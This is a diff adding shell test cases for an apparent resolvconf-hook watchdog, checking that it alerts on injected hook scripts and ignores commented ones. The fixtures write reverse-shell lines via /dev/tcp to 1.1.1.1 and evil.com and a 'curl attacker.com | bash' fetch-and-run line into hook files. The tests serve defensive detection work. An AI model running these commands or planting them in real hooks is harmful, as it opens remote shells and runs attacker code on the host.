@@ -209,3 +209,44 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-resolvconf-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): resolvconf-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/libc"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"resolvconf_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# libc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "resolvconf update"\n' > "${HOOKD}/libc"
+    run_wd
+    ! cap | grep -q '"event":"resolvconf_hooks_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /etc/resolvconf/update.d + /etc/resolvconf/update-libc.d axes — injection in ANY → alert)" {
+    HOOKD2="${TMP}/update-libc.d"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-libc-hook"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/libc"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
